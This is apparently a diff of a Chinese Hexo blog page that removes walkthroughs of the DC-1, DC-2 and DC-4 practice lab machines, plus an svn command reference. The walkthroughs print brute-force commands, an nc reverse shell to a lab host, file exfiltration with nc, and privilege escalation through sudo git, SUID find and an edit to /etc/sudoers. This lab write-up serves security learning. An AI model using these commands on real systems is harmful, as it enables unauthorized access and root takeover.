-        <a href="/2024/07/22/DC-4%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" class="archive-article-date">
-  	<time datetime="2024-07-22T01:06:53.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
-<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
-<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
-</ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><ol>
-<li>获取主机服务<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24 </span><br><span class="line">nmap -A -T4 -p- 192.168.193.137</span><br></pre></td></tr></table></figure>
-<img src="/img/DC-4/image0.png" alt="alt text"><br>提供ssh服务（端口22），提供http服务（端口80）。</li>
-</ol>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>发现提供http服务界面为登录界面，密码暴力破解。</p>
-<ol>
-<li>brup抓包，使用&#x2F;usr&#x2F;share&#x2F;john&#x2F;password.lst路径下文件，进行暴力破解。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin</span><br><span class="line">happy</span><br></pre></td></tr></table></figure></li>
-<li>利用命令行注入漏洞获取反弹shell<br><img src="/img/DC-4/image-0.png" alt="alt text"><br>可以知道这是一个典型命令行注入界面，使用brup修改包的内容，执行反弹shell命令即可。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 修改传送内容</span><br><span class="line">nc+-e+/bin/bash+192.168.193.128+10086</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p><img src="/img/DC-4/image.png" alt="alt text"><br>发现jim用户留下了密码本，可以再次进行密码破解。<br>传输文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.193.128 10085 &lt; old-passwords.bak</span><br><span class="line">nc -lvvp 10085 &gt; DC-4-P.txt</span><br></pre></td></tr></table></figure>
-
-<p>根据home目录获取用户名，再次进行密码破解。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -L DC-4-U.txt -P DC-4-P.txt ssh://192.168.193.137 -t 64</span><br><span class="line">jim jibril04</span><br></pre></td></tr></table></figure>
-
-<p>在邮件下查看到charles的密码<br><img src="/img/DC-4/image-1.png" alt="alt text"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">charles ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
-
-<p>查看charles权限<br><img src="/img/DC-4/image-2.png" alt="alt text"></p>
-<p>发现可以执行&#x2F;usr&#x2F;bin&#x2F;teehee，查看teehee用法<br><img src="/img/DC-4/image-3.png" alt="alt text"></p>
-<p>发现可以给任意文件添加任意内容，这里将charles提权为root用户。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teehee -a /etc/sudoers</span><br><span class="line">charles ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></table></figure>
-<p><img src="/img/DC-4/image-4.png" alt="alt text"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li>网站没有做密码暴力破解应对措施。</li>
-<li>网站存在命令行注入漏洞。</li>
-<li>用户保存密码本，且该密码本允许任意用户查看。</li>
-<li>用户可以sudo执行命令，无密码向任意文件追加任意内容。</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">DC系列靶机攻略</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/07/22/DC-4%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-DC-3靶机攻略" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/07/22/DC-3%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">DC-3靶机攻略</a>
-    </h1>
-  
-
-        
-        <a href="/2024/07/22/DC-3%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" class="archive-article-date">
-  	<time datetime="2024-07-22T01:06:48.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
-<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
-<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
-</ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">DC系列靶机攻略</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/07/22/DC-3%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-DC-2靶机攻略" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/07/22/DC-2%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">DC-2靶机攻略</a>
-    </h1>
-  
-
-        
-        <a href="/2024/07/22/DC-2%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" class="archive-article-date">
-  	<time datetime="2024-07-22T01:06:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
-<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
-<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
-</ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><ol>
-<li>寻找存活主机，获取提供服务信息。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br><span class="line">nmap -A -T4 -p- 192.168.193.139</span><br></pre></td></tr></table></figure>
-<img src="/img/DC-2/image.png" alt="alt text"><br>可以发现，提供ssh服务（端口为7744）以及http服务。</li>
-<li>打开网站获取信息<br><img src="/img/DC-2/image-1.png" alt="alt text"><br>可以发现，这是wordpress搭建的网站。</li>
-</ol>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><ol>
-<li>网站帐号密码获取。<br>wordpress搭建的网站，有专门的工具可以获取帐号密码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 获取登录界面url</span><br><span class="line">dirsearch -u http://dc-2/   </span><br><span class="line"># 获取登录用户名</span><br><span class="line">wpscan --url http://dc-2 --enumerate u</span><br><span class="line"># 获取密码本，该工具爬取网站内容，跟据爬取关键字生成密码本</span><br><span class="line">cewl http://dc-2 -w p.txt</span><br><span class="line"># 暴力破解密码</span><br><span class="line">wpscan --url http://dc-2 -U users.txt -P p.txt</span><br><span class="line">jerry adipiscing</span><br><span class="line">tom parturient</span><br></pre></td></tr></table></figure></li>
-<li>ssh登录<br>网站没有发现可以攻击的地方，可以尝试ssh，使用网站帐号密码登录，尝试tom登录成功。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@192.168.193.139 -p 7744</span><br><span class="line">parturient</span><br></pre></td></tr></table></figure></li>
-<li>rbash升级为bash<br>rbash存在限制，存在漏洞可以升级rbash为bash<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">export PATH=$PATH:/bin/</span><br><span class="line">export PATH=$PATH:/usr/bin</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><ol>
-<li>切换用户<br>发现tom没有权限，检查没有发现有用信息，尝试su切换到jerry用户，依旧使用网站爆破密码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su jerry</span><br><span class="line">adipiscing</span><br></pre></td></tr></table></figure></li>
-<li>git提权<br>切换用户成功后，查看用户权限。<br><img src="/img/DC-2/image-2.png" alt="alt text"><br>发现可以以root权限无密码使用git命令，接下来利用git漏洞提权。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo git help config</span><br><span class="line">!/bin/bash</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li>wordpress登录功能没有保护，可以使用工具暴力破解密码。</li>
-<li>ssh账户密码与网站账户密码相同，可以借助网站账户密码ssh获取设备终端。</li>
-<li>可以以root权限执行git，而git存在权限提升漏洞。</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">DC系列靶机攻略</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/07/22/DC-2%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-DC-1靶机攻略" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/07/22/DC-1%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">DC-1靶机攻略</a>
-    </h1>
-  
-
-        
-        <a href="/2024/07/22/DC-1%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/" class="archive-article-date">
-  	<time datetime="2024-07-22T01:04:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-22</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li><a href="#%E6%83%85%E6%8A%A5%E6%94%B6%E9%9B%86">情报收集</a></li>
-<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
-<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
-<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
-</ul>
-<h2 id="情报收集"><a href="#情报收集" class="headerlink" title="情报收集"></a>情报收集</h2><ol>
-<li>搜索存活主机ip<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.193.0/24</span><br></pre></td></tr></table></figure>
-<img src="/img/DC-1/image0.png" alt="alt text"></li>
-<li>获取攻击主机服务<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -p- 192.168.193.135</span><br></pre></td></tr></table></figure>
-<img src="/img/DC-1/image.png" alt="alt text"><br>可以看到开放了ssh服务，同时有服务器Drupal 7。</li>
-<li>漏洞搜索<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit Drupal</span><br></pre></td></tr></table></figure>
-<img src="/img/DC-1/image-1.png" alt="alt text"><br>可以看到，存在远程代码执行漏洞，可以利用它获取反弹shell。</li>
-</ol>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>使用metasploit利用漏洞获取反弹shell。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole   # 打开metasploit</span><br><span class="line">search Drupalgeddon  # 搜索攻击模块</span><br><span class="line">use exploit/unix/webapp/drupal_drupalgeddon2  # 选择攻击模块</span><br><span class="line">show missing  # 获取攻击模块需要配置的选项</span><br><span class="line">set RHOSTS 192.168.193.135  # 配置</span><br><span class="line">run  # 进行渗透攻击</span><br><span class="line">shell  # 获取反弹shell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;  # 升级反弹shell为终端交互</span><br></pre></td></tr></table></figure>
-<p><img src="/img/DC-1/image-2.png" alt="alt text"></p>
-<p><img src="/img/DC-1/image-3.png" alt="alt text"></p>
-<p><img src="/img/DC-1/image-4.png" alt="alt text"></p>
-<p><img src="/img/DC-1/image-5.png" alt="alt text"></p>
-<p><img src="/img/DC-1/image-6.png" alt="alt text"></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>这里利用find的s标志位进行权限提升。<br>首先查找具有s标志位的命令</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f -exec ls -la &#123;&#125; \; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-<p>发现find具有s标志位，可以利用它进行权限提升,这里使用find开启新的终端。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag4.txt -exec &quot;/bin/sh&quot; \;</span><br><span class="line">ls -l /root</span><br></pre></td></tr></table></figure>
-<p><img src="/img/DC-1/image-7.png" alt="alt text"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
-<li>Drupal 7存在远程代码执行漏洞，可以利用它获取反弹shell</li>
-<li>find具有s权限位，可以利用它进行权限提升</li>
-</ol>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">DC系列靶机攻略</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/07/22/DC-1%E9%9D%B6%E6%9C%BA%E6%94%BB%E7%95%A5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-svn命令" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2024/07/17/svn%E5%91%BD%E4%BB%A4/">svn命令</a>
-    </h1>
-  
-
-        
-        <a href="/2024/07/17/svn%E5%91%BD%E4%BB%A4/" class="archive-article-date">
-  	<time datetime="2024-07-17T01:18:02.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-07-17</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <ul>
-<li><a href="#%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4">常用命令</a></li>
-<li><a href="#%E7%A4%BA%E4%BE%8B%E8%AF%B4%E6%98%8E">示例说明</a></li>
-<li><a href="#%E8%BF%9B%E9%98%B6">进阶</a><ul>
-<li><a href="#%E6%89%B9%E9%87%8F%E6%B7%BB%E5%8A%A0%E5%B7%B2%E7%BB%8F%E5%88%A0%E9%99%A4%E7%9A%84%E6%96%87%E4%BB%B6%E5%88%B0svn%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%B8%AD%E6%9C%AC%E5%9C%B0%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6svn%E4%B9%9F%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6">批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）</a></li>
-</ul>
-</li>
-</ul>
-<h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><table>
-<thead>
-<tr>
-<th align="left">指令</th>
-<th align="left">解释</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">svn checkout</td>
-<td align="left">从服务器拉取代码到本地。</td>
-</tr>
-<tr>
-<td align="left">svn update</td>
-<td align="left">更新本地代码到最新版本。</td>
-</tr>
-<tr>
-<td align="left">svn commit</td>
-<td align="left">提交本地代码到版本库。</td>
-</tr>
-<tr>
-<td align="left">svn add</td>
-<td align="left">添加文件或目录到版本控制。</td>
-</tr>
-<tr>
-<td align="left">svn delete</td>
-<td align="left">删除文件或目录。</td>
-</tr>
-</tbody></table>
-<h1 id="示例说明"><a href="#示例说明" class="headerlink" title="示例说明"></a>示例说明</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">1. svn checkout path</span><br><span class="line">path 是服务器上的目录。</span><br><span class="line">例如：svn checkout svn://192.168.1.1/pro/domain</span><br><span class="line">简写：svn co</span><br><span class="line"></span><br><span class="line">1. svn add file</span><br><span class="line">file是某个文件或者某个目录，如果添加所有的文件则用点“.”表示。</span><br><span class="line">例如：svn add test.php</span><br><span class="line">svn add *.php（添加当前目录下所有的php文件）</span><br><span class="line">svn add . （表示添加所有文件）</span><br><span class="line"></span><br><span class="line">1. svn commit</span><br><span class="line">提交文件到服务器。</span><br><span class="line">例如：svn commit -m “add test file for my test”</span><br><span class="line">简写：svn  ci</span><br><span class="line">一般步骤：</span><br><span class="line">step-1：svn update</span><br><span class="line">step-2：svn add file、svn delete file</span><br><span class="line">step-3：svn commit -m “提交文件到远程服务器”</span><br><span class="line"></span><br><span class="line">1. svn update</span><br><span class="line">更新版本命令。</span><br><span class="line">svn update -r m path</span><br><span class="line">例如：</span><br><span class="line">(1) svn update 后面没有目录，默认更新当前目录及子目录的所有文件到最新版本。</span><br><span class="line">(2) svn update -r 200 test.php （将版本库中的文件test.php还原到版本200）</span><br><span class="line">简写：svn up</span><br><span class="line">update命令还可以进行文件恢复。 </span><br><span class="line">（1）不小心写错了很多东西，想撤销所写的东西（已经把修改提交到服务器）svn update -r 版本号 </span><br><span class="line">（2）不小心删错了文件，想把文件恢复回来（已经把删除提交到服务器）svn update -r 版本号</span><br><span class="line"></span><br><span class="line">1. svn status</span><br><span class="line">svn status -v path</span><br><span class="line">svn status path</span><br><span class="line">简写：svn st</span><br><span class="line"></span><br><span class="line">文件状态描述</span><br><span class="line">‘ ‘ 没有修改</span><br><span class="line">I 被忽略</span><br><span class="line">R 被替换</span><br><span class="line">~ 受控文件被其他文件阻隔</span><br><span class="line"></span><br><span class="line">&quot;!&quot;表示：本地执行了&quot;rm -rf&quot;，但是未执行&quot;svn del&quot;的状态。</span><br><span class="line">&quot;?&quot;表示：本地新加了一个文件，但是未执行&quot;svn add&quot;的状态。</span><br><span class="line">&quot;A&quot;表示：本地新加了一个文件，且执行了&quot;svn add&quot;的状态。</span><br><span class="line">&quot;X&quot;表示：执行了&quot;svn external&quot;的状态。</span><br><span class="line">&quot;D&quot;表示：本地执行了&quot;rm -rf&quot;，且执行了&quot;svn del&quot;的状态。</span><br><span class="line">&quot;M&quot;表示：本地修改了该文件时的状态。</span><br><span class="line">&quot;C&quot;表示：冲突状态，是重点关注状态之一。</span><br><span class="line"></span><br><span class="line">7. svn delete</span><br><span class="line">删除文件。</span><br><span class="line">svn delete path -m &quot;delete test file&quot;</span><br><span class="line">例如：</span><br><span class="line">1、删除远程服务器文件</span><br><span class="line">svn delete svn://192.168.1.1/pro/domain/test.php  -m &quot;delete test file&quot;</span><br><span class="line">2、删除本地文件，然后提交</span><br><span class="line">svn delete test.php， 然后再svn ci -m &quot;delete test file&quot;，推荐使用这种</span><br><span class="line">简写：svn (del, remove, rm)</span><br><span class="line"></span><br><span class="line">8. svn log</span><br><span class="line">查看日志。</span><br><span class="line">查看一段日期的日志</span><br><span class="line">svn log -r &#123;2018-07-03&#125;:&#123;2018-07-09&#125;</span><br><span class="line"></span><br><span class="line">9. 添加忽略文件</span><br><span class="line"># 创建一个名为.svnignore的文件，并添加.git/到文件中</span><br><span class="line">echo &quot;.git/&quot; &gt; .svnignore</span><br><span class="line"></span><br><span class="line"># 将.svnignore文件添加到svn:ignore属性中</span><br><span class="line">svn propset svn:ignore -F .svnignore .</span><br><span class="line"></span><br><span class="line"># 确认.svnignore文件被添加到忽略列表中</span><br><span class="line">svn status</span><br><span class="line"></span><br><span class="line"># 如果确认忽略列表正确，执行svn add和svn commit来上传文件夹到SVN</span><br><span class="line">svn add .</span><br><span class="line">svn commit -m &quot;Adding directory to SVN repository&quot;</span><br></pre></td></tr></table></figure>
-<h1 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h1><h2 id="批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）"><a href="#批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）" class="headerlink" title="批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）"></a>批量添加已经删除的文件到SVN管理系统中（本地删除文件，SVN也删除文件）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svn status | grep &#x27;!&#x27; | awk &#x27;&#123;print $2&#125;&#x27; | xargs svn delete</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">svn</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2024/07/17/svn%E5%91%BD%E4%BB%A4/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
     </nav>
   
 
@@ -1210,7 +1585,7 @@
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2024 John Doe
+    		&copy; 2024 anonymous
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -1310,6 +1685,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
